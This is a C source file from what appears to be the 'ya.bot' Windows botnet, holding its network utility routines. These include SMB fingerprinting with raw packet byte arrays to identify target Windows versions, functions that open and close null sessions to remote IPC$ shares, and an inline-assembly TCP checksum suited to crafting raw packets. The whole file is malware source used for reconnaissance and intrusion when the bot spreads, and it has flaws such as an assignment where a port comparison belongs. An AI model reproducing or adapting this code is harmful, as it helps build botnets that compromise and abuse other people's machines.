/*  ya.bot  */

#include "bot.h"

bool dnslookup(char *pszHost, char *pszBuffer, DWORD dwSize)
{
	DWORD dwAddress;
	hostent *he;
	IN_ADDR ia;
	if (ip_validip(pszHost))
	{
			dwAddress = inet_addr(pszHost);
			he = gethostbyaddr((char *)&dwAddress, sizeof(struct in_addr), AF_INET);
		if (!he)
				return FALSE;
			strncpy(pszBuffer, he->h_name, dwSize);
		if (!pszBuffer)
				return FALSE;
	}
	else
	{
			he = gethostbyname(pszHost);
		if (!he)
				return FALSE;
			ia = *((LPIN_ADDR)*he->h_addr_list);
			strncpy(pszBuffer, inet_ntoa(ia), dwSize);
		if (!pszBuffer)
				return FALSE;
	}
		return TRUE;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by houseofdabus & THC
//botbotbotbotbotbotbotbotbotbotbotbotbot

int fphost(char *pszIP, int nPort)
{
	char initiate[] =
			"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
			"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
			"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
			"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
			"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
			"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
			"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
			"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";
	char negotiate[] =
			"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
			"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
			"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
			"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
			"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
			"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
			"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
			"\x2E\x00\x30\x00\x00\x00\x00\x00";
	char detect[] =
			"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
			"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
			"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
			"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
			"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
			"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
			"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
			"\x00\x4F\x00\x44\x00\x00\x81\x19\x6A\x7A\xF2\xE4\x49\x1C\x28\xAF"
			"\x30\x25\x74\x10\x67\x53\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
			"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
			"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
			"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
			"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";
	char initiate139[] =
			"\x81\x00\x00\x44\x20\x43\x4B\x46\x44\x45\x4E\x45\x43\x46\x44\x45"
			"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
			"\x41\x43\x41\x43\x41\x00\x20\x45\x4B\x45\x44\x46\x45\x45\x49\x45"
			"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
			"\x41\x43\x41\x43\x41\x41\x41\x00";
	char negotiate139[] =
			"\x00\x00\x00\x2F\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5C\x02"
			"\x00\x00\x00\x00\x00\x0C\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E"
			"\x31\x32\x00";
	char detect139[] =
			"\x00\x00\x00\x48\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5C\x02"
			"\x00\x00\x00\x00\x0D\xFF\x00\x00\x00\xFF\xFF\x02\x00\x5C\x02\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0B"
			"\x00\x00\x00\x4A\x43\00\x41\x54\x54\x48\x43\x00";
	char szBuffer[1600], szChar[4], szOS[LOWBUF];
	int i, nCounter = 0, nRecvd;
	sockaddr_in sin;
	SOCKET sock;

#ifndef NO_DEBUG
		debug_print("Fingerprinting host, fphost()");
#endif

		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
			return OS_UNKNOWN;
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(pszIP);
		sin.sin_port = htons(nPort);
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
			closesocket(sock);
			return OS_UNKNOWN;
	}
	if (nPort == 139)
	{
		if (send(sock, initiate139, sizeof(initiate139) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (send(sock, negotiate139, sizeof(negotiate139) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (send(sock, detect139, sizeof(detect139) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
			nRecvd = recv(sock, szBuffer, sizeof(szBuffer) - 1, 0);
		if (nRecvd == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		while ((--nRecvd > 0) && (nCounter < 4)) 
		{
			if (szBuffer[nRecvd] == 0x00)
			{
				if (nCounter == 3)
						_snprintf(szOS, sizeof(szOS) - 1, (char *)&(szBuffer[nRecvd + 1]));
					nCounter++;
			}
		}
	}
	else if (nPort = 445)
	{
		if (send(sock, initiate, sizeof(initiate) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (send(sock, negotiate, sizeof(negotiate) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (send(sock, detect, sizeof(detect) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
		if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
		{
				closesocket(sock);
				return OS_UNKNOWN;
		}
			closesocket(sock);
			memset(szOS, 0, sizeof(szOS));
		for (i = 0; i < 12; i++)
		{
				_snprintf(szChar, sizeof(szChar) - 1, string_netutilsfpchar, szBuffer[48 + i * 2]);
				strncat(szOS, szChar, (sizeof(szChar) - strlen(szChar)) - 1);
		}
	}
	if (strcmp(string_netutilsfpwinnt, szOS) == 0)
			return OS_WINNT;
	else if (strcmp(string_netutilsfpwin2000, szOS) == 0)
			return OS_WIN2000;
	else if (strcmp(string_netutilsfpwinxp, szOS) == 0)
			return OS_WINXP;
	else if (strcmp(string_netutilsfpwin2003, szOS) == 0)
			return OS_WIN2003;
	else if (strcmp(string_netutilsfpwinvista, szOS) == 0)
			return OS_WINVISTA;
	else
			return OS_UNKNOWN;
}

char *ip_getip(SOCKET sock)
{
	int nSize;
	SOCKADDR sa;
	static char s_szIP[16];

#ifndef NO_DEBUG
		debug_print("Getting ip, ip_getip()");
#endif

		memset(&sa, 0, sizeof(sa));
		nSize = sizeof(sa);
	if (getsockname(sock, &sa, &nSize) == SOCKET_ERROR)
			return NULL;
		_snprintf(s_szIP, sizeof(s_szIP) - 1,
				string_netutilsipgetsockip,
				(BYTE)sa.sa_data[2],
				(BYTE)sa.sa_data[3],
				(BYTE)sa.sa_data[4],
				(BYTE)sa.sa_data[5]);
		return s_szIP;
}

bool ip_privateip(char *pszIP)
{
	char *p[1], szBuffer[32];

#ifndef NO_DEBUG
		debug_print("Checking if IP is private, ip_privateip()");
#endif

		strncpy(szBuffer, pszIP, sizeof(szBuffer) - 1);
		p[0] = strtok(szBuffer, ".");
	if (!p[0])
			return FALSE;
	else if (strcmp(string_netutilsipprivateclassa, p[0]) == 0)
			return TRUE;
	else if (strcmp(string_netutilsipprivateclassb, p[0]) == 0)
			return TRUE;
	else if (strcmp(string_netutilsipprivateclassc, p[0]) == 0)
			return TRUE;
		return FALSE;
}

bool ip_validip(char *pszIP)
{

#ifndef NO_DEBUG
		debug_print("Checking if IP is valid, ip_validip()");
#endif

	if (inet_addr(pszIP) == INADDR_NONE)
			return FALSE;
		return TRUE;
}

bool nullsession_close(char *pszHost)
{
	char szResource[MEDBUF];

#ifndef NO_DEBUG
		debug_print("Closing null session, nullsession_close()");
#endif

		_snprintf(szResource, sizeof(szResource) - 1, string_netutilsnullsessionipc, pszHost);
	if (WNetCancelConnection2(szResource, 0, FALSE) != NO_ERROR)
			return FALSE;
		return TRUE;
}

bool nullsession_open(char *pszHost)
{
	char szResource[MEDBUF];
	NETRESOURCE nrResource;

#ifndef NO_DEBUG
		debug_print("Opening null session, nullsession_open()");
#endif

		_snprintf(szResource, sizeof(szResource) - 1, string_netutilsnullsessionipc, pszHost);
		nrResource.dwType = RESOURCETYPE_ANY;
		nrResource.lpLocalName = NULL;
		nrResource.lpProvider = NULL;
		nrResource.lpRemoteName = szResource;
	if (WNetAddConnection2(&nrResource, NULL, NULL, 0) != NO_ERROR)
			return FALSE;
		return TRUE;
}

USHORT tcpchecksum(USHORT *usBuffer, int nSize) 
{ 
	unsigned long cksum = 0;

#ifndef NO_DEBUG
		debug_print("Calculating TCP checksum, tcpchecksum()");
#endif

/*	while (nSize > 1)
	{
			cksum += *usBuffer++;
			nSize -= sizeof(USHORT);
	}
	if (nSize)
			cksum += *(UCHAR *)usBuffer;
		cksum = (cksum >> 16) + (cksum & 0xFFFF);
		cksum += cksum >> 16;*/

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Ago
//botbotbotbotbotbotbotbotbotbotbotbotbot

	__asm
	{
			FEMMS

			MOV ECX, nSize				//ecx = nSize;
			MOV EDX, usBuffer			//edx = usBuffer;
			MOV EBX, cksum				//ebx = cksum;

			CMP ECX, 2					//nSize < 2;
			JS CKSUM_LOOP2				//goto loop 2

		CKSUM_LOOP:
			XOR EAX, EAX				//eax = 0;
			MOV AX, WORD PTR [EDX]		//ax = (unsigned short *)*usBuffer;
			ADD EBX, EAX				//cksum += (unsigned short *)*usBuffer;

			SUB ECX, 2					//nSize -= 2;
			ADD EDX, 2					//usBuffer += 2;
			CMP ECX, 1					//nSize > 1;
			JG CKSUM_LOOP				//while();

			CMP ECX, 0					//if (!nSize);
			JE CKSUM_FITS				//fits if equal

		CKSUM_LOOP2:
			XOR EAX, EAX				//eax = 0;
			MOV AL, BYTE PTR [EDX]		//al = (unsigned char *)*usBuffer;
			ADD EBX, EAX				//cksum += (unsigned char *)*usBuffer;

			SUB ECX, 1					//nSize -= 1;
			ADD EDX, 1					//usBuffer += 1;
			CMP ECX, 0					//nSize > 0;
			JG CKSUM_LOOP2				//while();

		CKSUM_FITS:
			MOV cksum, EBX				//cksum = ebx;

			MOV EAX, cksum				//eax = cksum;
			SHR EAX, 16					//eax = cksum >> 16;
			MOV EBX, cksum				//ebx = cksum;
			AND EBX, 0xFFFF				//ebx = cksum & 0xFFFF;

			ADD EAX, EBX				//eax = (cksum >> 16) + (cksum & 0xFFFF);

			MOV EBX, EAX				//ebx = cksum;
			SHR EBX, 16					//ebx = cksum >> 16;
			ADD EAX, EBX				//cksum += (cksum >> 16);

			MOV cksum, EAX				//cksum = EAX;

			FEMMS
	}
		return (USHORT)(~cksum);
}